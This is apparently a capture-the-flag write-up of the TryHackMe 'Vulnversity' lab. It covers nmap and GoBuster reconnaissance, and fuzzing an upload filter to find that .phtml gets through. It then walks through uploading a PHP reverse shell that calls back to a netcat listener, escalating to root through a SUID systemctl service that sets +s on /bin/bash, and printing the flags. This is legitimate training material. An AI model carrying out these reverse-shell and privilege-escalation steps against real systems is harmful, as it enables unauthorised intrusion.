# Vulnversity

>## LegendSpam(@mr!t G!r!) | Oct 06 2022
<br>

># Task 1 Deploy the machine 

### Connect to our network and deploy this machine. If you are unsure on how to get connected, complete the OpenVPN room first.
```
 Start Machine
```

># Task 2 Reconnaissance 

Gather information about this machine using a network scanning tool called ```nmap```. Check out the Nmap room for more on this!

Don't have a Linux machine with nmap on? Deploy your own AttackBox and control it with your browser.

# Answer the questions below



### Scan this box: nmap -sV < machines ip >

 ![image](https://i.imgur.com/gZqOO8D.png)

nmap is an free, open-source and powerful tool used to discover hosts and services on a computer network. In our example, we are using nmap to scan this machine to identify all services that are running on a particular port. nmap has many capabilities, below is a table summarising some of the functionality it provides.

###  nmap flag	Description

Display Table in README.md file in Git


| Nmap flag     | City   
| ------------- | --------    |
| `-sV`         |  `Attempts to determine the version of the services running`   |
| `-p<x> or -p-`|  `Port scan for port <x> or scan all ports`   |
| `Pn`          | `Disable host discovery and just scan for open ports` |
| `-A`	        | `Enables OS and version detection, executes in-build scripts for further enumeration.` | 
|`-sC`	       | `Scan with the default nmap scripts` | 
|`-v	`           | `Verbose mode` |
|`-sU`	       | `UDP port scan` |
|`-sS`	       | `TCP SYN port scan` |

```yml
 nmap -sV -Pn 10.10.237.96
```

## Scan the box, how many ports are open?
```yaml
┌──(kali㉿kali)-[~/Documents/THM/Vulnversity]
└─$ nmap -sV -Pn 10.10.237.96 

Starting Nmap 7.92 ( https://nmap.org ) at 2022-10-05 21:02 EDT
Nmap scan report for 10.10.237.96
Host is up (0.18s latency).
Not shown: 994 closed tcp ports (conn-refused)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 3.0.3
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
3128/tcp open  http-proxy  Squid http proxy 3.5.12
3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.77 seconds
 
```
@Answer
```yaml
 6
```
## What version of the squid proxy is running on the machine?
```yaml
 3.5.12
```
## How many ports will nmap scan if the flag -p-400 was used?
```yaml
 400
 ```

 ## Using the nmap flag -n what will it not resolve?
```yaml
 DNS
```
## What is the most likely operating system this machine is running?
```yaml
 Ubuntu
```

## What port is the web server running on?
```yaml
 3333
```

### Its important to ensure you are always doing your reconnaissance thoroughly before progressing. Knowing all open services (which can all be points of exploitation) is very important, don't forget that ports on a higher range might be open so always scan ports after 1000 (even if you leave scanning in the background)
```yaml
```

># Task 3 Locating directories using GoBuster 

### Using a fast directory discovery tool called GoBuster you will locate a directory that you can use to upload a shell to.

## Answer the questions below
### Lets first start of by scanning the website to find any hidden directories. To do this, we're going to use GoBuster.
![image](https://i.imgur.com/gODlTeh.png)

GoBuster is a tool used to brute-force URIs (directories and files), DNS subdomains and virtual host names. For this machine, we will focus on using it to brute-force directories.

Download GoBuster here, or if you're on Kali Linux 2020.1+ run `sudo apt-get install gobuster`

To get started, you will need a wordlist for GoBuster (which will be used to quickly go through the wordlist to identify if there is a public directory available. If you are using `Kali Linux` you can find many wordlists under `/usr/share/wordlists`.

### Now lets run GoBuster with a wordlist: `gobuster dir -u http://<ip>:3333 -w <word list location>`


| GoBuster Flag  | Description |
| -------------- | ------------- |
| `-e` | `Print the full URLs in your console` |
| `-u` | `The target URL` |
| `-w` | `Path to your wordlist` `E.g:  /usr/share/wordlists/dirbuster/` |
| `-U and -P` |  `Username and Password for Basic Auth` |
| `-p <x>` | `Proxy to use for requests` |
| `-c <http cookies>` | `Specify a cookie for simulating your auth` |

## What is the directory that has an upload form page?
```yaml
┌──(kali㉿kali)-[~/Documents/THM/Vulnversity]
└─$ gobuster dir -u "http://10.10.237.96:3333/" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.237.96:3333/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/10/05 22:42:21 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 320] [--> http://10.10.237.96:3333/images/]                                             /css                  (Status: 301) [Size: 317] [--> http://10.10.237.96:3333/css/]                                            /js                   (Status: 301) [Size: 316] [--> http://10.10.237.96:3333/js/]    
/fonts                (Status: 301) [Size: 319] [--> http://10.10.237.96:3333/fonts/] 
/internal             (Status: 301) [Size: 322] [--> http://10.10.237.96:3333/internal/]
Progress: 20071 / 220561 (9.10%)                                                      
            ^C
[!] Keyboard interrupt detected, terminating.
                                                                                        
===============================================================
2022/10/05 22:48:26 Finished
===============================================================

```
### `@Answer`
```yaml
 /internal/
```

># Task 4 Compromise the webserver 

### Now you have found a form to upload files, we can leverage this to upload and execute our payload that will lead to compromising the web server.
```yaml
 upload evershall.phtml file.
```


# Answer the questions below
## What common file type, which you'd want to upload to exploit the server, is blocked? Try a couple to find out.
```yaml
  .php
```
To identify which extensions are not blocked, we're going to fuzz the upload form.

To do this, we're going to use BurpSuite. If you are unsure to what BurpSuite is, or how to set it up please complete our BurpSuite room first.

![image](https://i.imgur.com/j71CW1A.png)



We're going to use Intruder (used for automating customised attacks).

To begin, make a wordlist with the following extensions in:

![image](https://i.imgur.com/ED153Nx.png)

Now make sure BurpSuite is configured to intercept all your browser traffic. Upload a file, once this request is captured, send it to the Intruder. Click on "Payloads" and select the "Sniper" attack type.

Click the "Positions" tab now, find the filename and "Add §" to the extension. It should look like so:

![image](https://i.imgur.com/6dxnzq6.png)

## Run this attack, what extension is allowed?
```yaml
 .phtml
```

Now we know what extension we can use for our payload we can progress.

We are going to use a PHP reverse shell as our payload. A reverse shell works by being called on the remote host and forcing this host to make a connection to you. So you'll listen for incoming connections, upload and have your shell executed which will beacon out to you to control!

Download the following reverse PHP shell here.

To gain remote access to this machine, follow these steps:

    1. Edit the php-reverse-shell.php file and edit the ip to be your tun0 ip (you can get this by going to http://10.10.10.10 in the browser of your TryHackMe connected device).

    2. Rename this file to php-reverse-shell.phtml

    3. We're now going to listen to incoming connections using netcat. Run the following command: nc -lvnp 1234

    4. Upload your shell and navigate to http://<ip>:3333/internal/uploads/php-reverse-shell.phtml - This will execute your payload

    5. You should see a connection on your netcat session

![image](https://i.imgur.com/FGcvTCp.png)

## What is the name of the user who manages the webserver?
```yaml
 bill
```
## What is the user flag?
```yaml
 8bd7992fbe8a6ad22a63361004cfcedb
```

># Task 5 Privilege Escalation 
Now you have compromised this machine, we are going to escalate our privileges and become the superuser (root).

# Answer the questions below


In Linux, SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary permissions to a user to run the program/file with the permission of the file owner (rather than the user who runs it).

For example, the binary file to change your password has the SUID bit set on it (/usr/bin/passwd). This is because to change your password, it will need to write to the shadowers file that you do not have access to, root does, so it has root privileges to make the right changes.

![image](https://i.imgur.com/ZhaNR2p.jpg)

## On the system, search for all SUID files. What file stands out?
```yaml
 /bin/systemctl
```

### Its challenge time! We have guided you through this far, are you able to exploit this system further to escalate your privileges and get the final answer?
```yaml
┌──(kali㉿kali)-[~/Desktop]
└─$ nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.18.8.23] from (UNKNOWN) [10.10.237.96] 47082
Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 01:45:16 up  5:00,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ python -c "import pty; pty.spawn('/bin/bash')"
bash-4.3$ ls
ls
bin   etc         lib         media  proc  sbin  sys  var
boot  home        lib64       mnt    root  snap  tmp  vmlinuz
dev   initrd.img  lost+found  opt    run   srv   usr

bash-4.3$ TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod +s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
/bin/systemctl link $TF
/bin/systemctl enable --now $TFTF=$(mktemp).service
bash-4.3$ echo '[Service]
> Type=oneshot
> ExecStart=/bin/sh -c "chmod +s /bin/bash"
> [Install]
> WantedBy=multi-user.target' > $TF
bash-4.3$ /bin/systemctl link $TF
Created symlink from /etc/systemd/system/tmp.L2ZnoQIOt3.service to /tmp/tmp.L2ZnoQIOt3.service.
bash-4.3$ 
/bin/systemctl enable --now $TF
Created symlink from /etc/systemd/system/multi-user.target.wants/tmp.L2ZnoQIOt3.service to /tmp/tmp.L2ZnoQIOt3.service.
bash-4.3$ 

bash-4.3$ ls
ls
bin   etc         lib         media  proc  sbin  sys  var
boot  home        lib64       mnt    root  snap  tmp  vmlinuz
dev   initrd.img  lost+found  opt    run   srv   usr
bash-4.3$ ls -l /bin/bash
ls -l /bin/bash
-rwsr-sr-x 1 root root 1037528 May 16  2017 /bin/bash
bash-4.3$ cd root
cd root
bash: cd: root: Permission denied
bash-4.3$ cd /root
cd /root
bash: cd: /root: Permission denied
bash-4.3$ /bin/bash -p
/bin/bash -p
bash-4.3# whoami
whoami
root
bash-4.3# ls
ls
bin   etc         lib         media  proc  sbin  sys  var
boot  home        lib64       mnt    root  snap  tmp  vmlinuz
dev   initrd.img  lost+found  opt    run   srv   usr
bash-4.3# cd root
cd root
bash-4.3# ls
ls
root.txt
bash-4.3# cat root.txt
cat root.txt
a58ff8579f0a9270368d33a9966c7fd5
bash-4.3# 
```

## Become root and get the last flag (/root/root.txt)
```yaml
 a58ff8579f0a9270368d33a9966c7fd5
```